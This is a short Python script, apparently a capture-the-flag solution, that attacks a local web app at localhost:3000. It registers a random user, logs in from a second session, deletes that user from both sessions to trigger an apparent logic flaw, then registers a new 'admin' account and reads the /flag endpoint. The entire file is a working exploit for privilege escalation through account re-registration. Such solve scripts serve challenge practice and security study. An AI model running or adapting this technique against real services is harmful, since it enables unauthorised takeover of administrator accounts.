import uuid
import requests

HOST = 'http://localhost:3000'
USERNAME, PASSWORD = 'test', 'test'

u, p = str(uuid.uuid4()), str(uuid.uuid4())
s1 = requests.Session()
s1.auth = USERNAME, PASSWORD
s1.post(f'{HOST}/register', data={
    'username': u,
    'password': p,
    'profile': 'aaa'
})

s2 = requests.Session()
s2.auth = USERNAME, PASSWORD
s2.post(f'{HOST}/login', data={
    'username': u,
    'password': p
})
s1.post(f'{HOST}/user/{u}/delete')
s2.post(f'{HOST}/user/{u}/delete')

s3 = requests.Session()
s3.auth = USERNAME, PASSWORD
s3.post(f'{HOST}/register', data={
    'username': 'admin',
    'password': 'admin',
    'profile': 'aaa'
})

print(s3.get(f'{HOST}/flag').text)